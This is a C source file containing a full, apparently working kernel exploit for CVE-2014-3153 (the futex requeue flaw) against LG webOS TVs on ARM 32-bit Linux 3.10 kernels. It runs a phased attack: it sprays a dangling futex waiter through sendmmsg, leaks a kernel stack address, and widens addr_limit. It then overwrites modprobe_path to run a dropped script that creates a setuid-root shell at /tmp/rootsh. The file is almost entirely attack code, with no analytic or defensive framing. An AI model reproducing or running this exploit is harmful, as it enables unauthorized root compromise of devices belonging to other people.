/*
 * CVE-2014-3153 exploit for LG webOS TVs
 * Targets ARM 32-bit kernels 3.10.x with 2G/2G or 3G/1G VA split.
 *
 * Resolves kernel addresses dynamically via /proc/kallsyms (if readable)
 * or falls back to a built-in table of known kernel versions.
 *
 * Strategy: futex requeue bug creates a dangling waiter whose prio_list
 * is sprayed via sendmmsg. Phase 1 leaks a kernel stack address to locate
 * thread_info and addr_limit. Phase 2 redirects the spray target to
 * addr_limit. Phase 3 expands addr_limit to 0xFFFFFFFF. Phase 4 uses
 * pipe read/write to overwrite modprobe_path with "/tmp/r", then triggers
 * modprobe to run our script as root.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <arpa/inet.h>
#include <linux/futex.h>

#include "kernels.h"

#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI  11
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI   12
#endif

#define MAPPED_ADDR     0x60000000
#define MAPPED_SIZE     0x110000
#define SPRAY_ADDR      (MAPPED_ADDR + 0x0800)
#define DATABUF_OFF     0x0000
#define IOV_OFF         0x0080
#define PRIO_PREV_IDX   7
#define SIGNAL_HACK     12
#define LOCAL_PORT      5551

static unsigned long g_modprobe_path;
static unsigned long g_kernel_base;

struct mmsghdr_local {
    struct msghdr msg_hdr;
    unsigned int  msg_len;
};

static int swag = 0, swag2 = 0;
static pid_t waiter_tid;
static int server_fd = -1;
static unsigned long mapped_base;

static volatile int do_sock_sync = 0, did_sock_sync = 0;
static volatile int do_pi_sync = 0, did_pi_sync = 0;
static volatile int sync_alarm = 0;

static volatile sig_atomic_t hack_done = 0;
static volatile sig_atomic_t hack_ok = 0;

static pid_t last_tid;
static pthread_mutex_t tid_lock = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t  tid_cond = PTHREAD_COND_INITIALIZER;

/* --- address resolution --- */

static unsigned long kallsyms_lookup(const char *name)
{
    FILE *fp;
    char line[256];
    unsigned long addr;
    char type;
    char sym[128];

    fp = fopen("/proc/kallsyms", "r");
    if (!fp)
        return 0;
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%lx %c %127s", &addr, &type, sym) == 3) {
            if (strcmp(sym, name) == 0 && addr != 0) {
                fclose(fp);
                return addr;
            }
        }
    }
    fclose(fp);
    return 0;
}

static int detect_mem_split(void)
{
    unsigned long stext = kallsyms_lookup("stext");
    if (stext == 0)
        stext = kallsyms_lookup("_text");
    if (stext >= 0xC0000000)
        return 3;
    if (stext >= 0x80000000)
        return 2;
    return 0;
}

static const struct kernel_info *lookup_kernel(const char *version)
{
    const struct kernel_info *ki;
    for (ki = known_kernels; ki->version; ki++) {
        if (strcmp(ki->version, version) == 0)
            return ki;
    }
    return NULL;
}

static int resolve_addresses(void)
{
    struct utsname uts;
    unsigned long mp;

    /* try kallsyms first */
    mp = kallsyms_lookup("modprobe_path");
    if (mp) {
        g_modprobe_path = mp;
        int split = detect_mem_split();
        if (split) {
            g_kernel_base = (split == 3) ? 0xC0000000 : 0x80000000;
            printf("[+] kallsyms: modprobe_path=0x%08lx split=%dG/%dG\n",
                   g_modprobe_path, 4 - split, split);
            return 0;
        }
    }

    /* fall back to kernel DB */
    if (uname(&uts) < 0) {
        perror("uname");
        return -1;
    }
    printf("[*] kernel: %s\n", uts.release);

    const struct kernel_info *ki = lookup_kernel(uts.release);
    if (ki) {
        g_modprobe_path = ki->modprobe_path;
        g_kernel_base = (ki->mem_split == 3) ? 0xC0000000 : 0x80000000;
        printf("[+] kernel DB: modprobe_path=0x%08lx split=%dG/%dG\n",
               g_modprobe_path, 4 - ki->mem_split, ki->mem_split);
        return 0;
    }

    fprintf(stderr, "[-] Unknown kernel %s and kallsyms not readable.\n"
            "    Add this kernel to src/kernels.h or check /proc/kallsyms.\n",
            uts.release);
    return -1;
}

/* --- helpers --- */

static int read_vcsw(pid_t pid)
{
    char path[256], buf[4096];
    FILE *fp;
    int val = -1;
    sprintf(path, "/proc/self/task/%d/status", pid);
    fp = fopen(path, "r");
    if (!fp) return -1;
    while (fgets(buf, sizeof(buf), fp)) {
        if (strncmp(buf, "voluntary_ctxt_switches:", 24) == 0) {
            val = atoi(buf + 25);
            break;
        }
    }
    fclose(fp);
    return val;
}

static void alrm_handler(int s) { (void)s; sync_alarm = 1; }

static int sync_child(pid_t tid, volatile int *req, volatile int *done)
{
    struct sigaction sa;
    int v, i;
    memset(&sa, 0, sizeof(sa));
    sync_alarm = 0;
    sa.sa_handler = alrm_handler;
    sigaction(SIGALRM, &sa, NULL);
    alarm(5);
    while (!*req) { if (sync_alarm) return -1; usleep(10); }
    alarm(0);
    v = read_vcsw(tid);
    *done = 1;
    for (i = 0; i < 500000; i++) {
        if (read_vcsw(tid) > v) return 0;
        usleep(10);
    }
    return -1;
}

static void sync_parent(volatile int *req, volatile int *done)
{
    *req = 1;
    while (!*done) usleep(1);
}

/* --- signal handler (kwrite via pipe r/w) --- */

static void hack_handler(int signum)
{
    int pfd[2];
    char payload[] = "/tmp/r";
    char vbuf[64];
    int i;

    (void)signum;

    if (pipe(pfd) == 0) {
        if (write(pfd[1], payload, sizeof(payload)) == (ssize_t)sizeof(payload) &&
            read(pfd[0], (void *)g_modprobe_path,
                 sizeof(payload)) == (ssize_t)sizeof(payload)) {
            hack_ok = 1;
        }
        close(pfd[0]); close(pfd[1]);
    }

    if (hack_ok && pipe(pfd) == 0) {
        for (i = 0; i < (int)sizeof(vbuf); i++) vbuf[i] = 0;
        if (write(pfd[1], (void *)g_modprobe_path, 32) == 32)
            read(pfd[0], vbuf, 32);
        close(pfd[0]); close(pfd[1]);
        write(STDOUT_FILENO, "[hack] modprobe=", 16);
        for (i = 0; vbuf[i] && i < 32; i++) ;
        write(STDOUT_FILENO, vbuf, i);
        write(STDOUT_FILENO, "\n", 1);
    }

    hack_done = 1;
    for (;;) pause();
}

/* --- socket for sendmmsg spray --- */

static int make_server(void)
{
    int s, y = 1;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    s = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &y, sizeof(y));
    a.sin_family = AF_INET;
    a.sin_port = htons(LOCAL_PORT);
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    bind(s, (struct sockaddr *)&a, sizeof(a));
    listen(s, 1);
    return s;
}

static int do_connect(void)
{
    int s, bs = 1;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    while (1) {
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) { usleep(100); continue; }
        a.sin_family = AF_INET;
        a.sin_port = htons(LOCAL_PORT);
        a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (connect(s, (struct sockaddr *)&a, sizeof(a)) == 0) break;
        close(s); usleep(100);
    }
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &bs, sizeof(bs));
    return s;
}

/* --- waiter thread --- */

static void *waiter_fn(void *arg)
{
    int sockfd;
    struct mmsghdr_local mv[1];
    unsigned long *db = (unsigned long *)(mapped_base + DATABUF_OFF);
    struct iovec *iv   = (struct iovec *)(mapped_base + IOV_OFF);

    (void)arg;
    waiter_tid = syscall(__NR_gettid);
    setpriority(PRIO_PROCESS, 0, 12);
    sockfd = do_connect();

    memset(mv, 0, sizeof(mv));
    mv[0].msg_hdr.msg_name       = db;
    mv[0].msg_hdr.msg_namelen    = 32 * sizeof(unsigned long);
    mv[0].msg_hdr.msg_iov        = iv;
    mv[0].msg_hdr.msg_iovlen     = 8;
    mv[0].msg_hdr.msg_control    = db;
    mv[0].msg_hdr.msg_controllen = 32;

    syscall(__NR_futex, &swag, FUTEX_WAIT_REQUEUE_PI, 0, 0, &swag2, 0);
    sync_parent(&do_sock_sync, &did_sock_sync);
    while (syscall(__NR_sendmmsg, sockfd, mv, 1, 0) > 0) ;
    return NULL;
}

/* --- lock-pi thread --- */

static void *lock_pi_fn(void *arg)
{
    int prio = (int)(long)arg;
    last_tid = syscall(__NR_gettid);
    pthread_mutex_lock(&tid_lock);
    pthread_cond_signal(&tid_cond);
    setpriority(PRIO_PROCESS, 0, prio);
    pthread_mutex_unlock(&tid_lock);
    sync_parent(&do_pi_sync, &did_pi_sync);
    syscall(__NR_futex, &swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
    while (1) sleep(3600);
    return NULL;
}

static pid_t do_lock_pi(int prio)
{
    pthread_t th;
    pid_t tid;
    do_pi_sync = 0;
    did_pi_sync = 0;
    pthread_mutex_lock(&tid_lock);
    pthread_create(&th, NULL, lock_pi_fn, (void *)(long)prio);
    pthread_detach(th);
    pthread_cond_wait(&tid_cond, &tid_lock);
    tid = last_tid;
    if (sync_child(tid, &do_pi_sync, &did_pi_sync) < 0) {
        pthread_mutex_unlock(&tid_lock);
        return -1;
    }
    pthread_mutex_unlock(&tid_lock);
    return tid;
}

/* --- drain and resync --- */

static int drain_and_resync(void)
{
    char trash[4096];
    int fl, v, i;
    fl = fcntl(server_fd, F_GETFL, 0);
    fcntl(server_fd, F_SETFL, fl | O_NONBLOCK);
    while (read(server_fd, trash, sizeof(trash)) > 0) ;
    fcntl(server_fd, F_SETFL, fl);
    v = read_vcsw(waiter_tid);
    if (v < 0) return -1;
    for (i = 0; i < 500000; i++) {
        if (read_vcsw(waiter_tid) > v) return 0;
        usleep(10);
    }
    return -1;
}

/* --- prepare helper files --- */

static void prepare_helpers(void)
{
    FILE *fp;
    fp = fopen("/tmp/r", "w");
    if (fp) {
        fprintf(fp, "#!/bin/sh\n");
        fprintf(fp, "id > /tmp/rooted\n");
        fprintf(fp, "chown root:root /tmp/rootsh 2>/dev/null\n");
        fprintf(fp, "chmod 4755 /tmp/rootsh 2>/dev/null\n");
        fprintf(fp, "echo ok >> /tmp/rooted\n");
        fclose(fp);
        chmod("/tmp/r", 0755);
    }
    fp = fopen("/tmp/trigger", "w");
    if (fp) {
        fputc(0xff, fp); fputc(0xff, fp);
        fputc(0xff, fp); fputc(0xff, fp);
        fclose(fp);
        chmod("/tmp/trigger", 0755);
    }
}

/* --- main --- */

int main(int argc, char **argv)
{
    pthread_t wthr;
    unsigned long *databuf;
    struct iovec *iov;
    unsigned long spray = SPRAY_ADDR;
    unsigned long kaddr, ti, al;
    pid_t hack_tid;
    int srv, i;
    struct sigaction sa;

    (void)argc; (void)argv;

    printf("=== towelroot - LG webOS CVE-2014-3153 ===\n");
    printf("pid=%d uid=%d\n", getpid(), getuid());

    if (resolve_addresses() < 0)
        return 1;

    prepare_helpers();

    mapped_base = (unsigned long)mmap((void *)MAPPED_ADDR, MAPPED_SIZE,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    if (mapped_base == (unsigned long)MAP_FAILED) { perror("mmap"); return 1; }
    memset((void *)mapped_base, 0, MAPPED_SIZE);

    databuf = (unsigned long *)(mapped_base + DATABUF_OFF);
    iov     = (struct iovec *)(mapped_base + IOV_OFF);
    for (i = 0; i < 32; i++) databuf[i] = spray;
    for (i = 0; i < 8; i++) {
        iov[i].iov_base = (void *)spray;
        iov[i].iov_len  = 0x10;
    }
    printf("[*] spray=0x%08lx\n", spray);

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = hack_handler;
    sigaction(SIGNAL_HACK, &sa, NULL);

    srv = make_server();
    pthread_create(&wthr, NULL, waiter_fn, NULL);
    server_fd = accept(srv, NULL, NULL);
    close(srv);
    if (server_fd < 0) { printf("[-] accept\n"); return 1; }

    syscall(__NR_futex, &swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
    while (syscall(__NR_futex, &swag, FUTEX_CMP_REQUEUE_PI,
                   1, 0, &swag2, swag) != 1) usleep(10);

    do_lock_pi(6);
    do_lock_pi(7);

    /* trigger bug */
    swag2 = 0;
    do_sock_sync = 0;
    did_sock_sync = 0;
    syscall(__NR_futex, &swag2, FUTEX_CMP_REQUEUE_PI, 1, 0, &swag2, swag2);

    if (sync_child(waiter_tid, &do_sock_sync, &did_sock_sync) < 0) {
        printf("[-] spray sync\n"); goto hang;
    }
    printf("[+] spray active\n");

    /* Phase 1: leak kernel stack address */
    hack_tid = do_lock_pi(11);
    if (hack_tid < 0) { printf("[-] probe1 sync\n"); goto hang; }

    kaddr = *(volatile unsigned long *)spray;
    if (kaddr < g_kernel_base || kaddr > 0xF0000000) {
        printf("[-] probe1: 0x%08lx (expected >= 0x%08lx)\n", kaddr, g_kernel_base);
        goto hang;
    }
    ti = kaddr & ~0x1FFFUL;
    al = ti + 8;
    printf("[+] leak=0x%08lx ti=0x%08lx al=0x%08lx\n", kaddr, ti, al);

    /* Phase 2: redirect spray to addr_limit */
    databuf[PRIO_PREV_IDX] = al;
    *(volatile unsigned long *)spray = 0;
    if (drain_and_resync() < 0) { printf("[-] resync\n"); goto hang; }
    printf("[+] re-sprayed databuf[%d]=0x%08lx\n", PRIO_PREV_IDX, al);

    /* Phase 3: expand addr_limit */
    if (do_lock_pi(11) < 0) { printf("[-] probe2 sync\n"); goto hang; }
    printf("[+] addr_limit expanded\n");

    /* Phase 4: kwrite modprobe_path via signal handler */
    printf("[*] tkill %d sig %d\n", hack_tid, SIGNAL_HACK);
    fflush(stdout);
    syscall(__NR_tkill, hack_tid, SIGNAL_HACK);

    for (i = 0; i < 5000000 && !hack_done; i++) usleep(10);
    if (!hack_done) { printf("[-] hack no response\n"); goto hang; }
    if (!hack_ok)   { printf("[-] kwrite fail\n"); goto hang; }
    printf("[+] modprobe_path overwritten\n");

    /* Phase 5: trigger modprobe */
    printf("[*] trigger modprobe\n");
    fflush(stdout);
    {
        pid_t ch = fork();
        if (ch == 0) { execl("/tmp/trigger", "/tmp/trigger", NULL); _exit(127); }
        if (ch > 0) { int st; waitpid(ch, &st, 0); }
    }
    usleep(500000);

    if (access("/tmp/rooted", F_OK) == 0) {
        printf("\n[+] ROOT ACHIEVED\n");
        fflush(stdout);
        system("cat /tmp/rooted");
        system("ls -la /tmp/rootsh 2>/dev/null");
        system("/tmp/rootsh -c 'id' 2>/dev/null");
    } else {
        printf("[-] /tmp/rooted missing, retry\n");
        {
            pid_t ch = fork();
            if (ch == 0) { execl("/tmp/trigger", "/tmp/trigger", NULL); _exit(127); }
            if (ch > 0) { int st; waitpid(ch, &st, 0); }
        }
        usleep(500000);
        if (access("/tmp/rooted", F_OK) == 0) {
            printf("[+] retry worked\n");
            system("cat /tmp/rooted");
        }
    }

hang:
    printf("[*] holding...\n");
    fflush(stdout);
    while (1) sleep(3600);
    return 0;
}
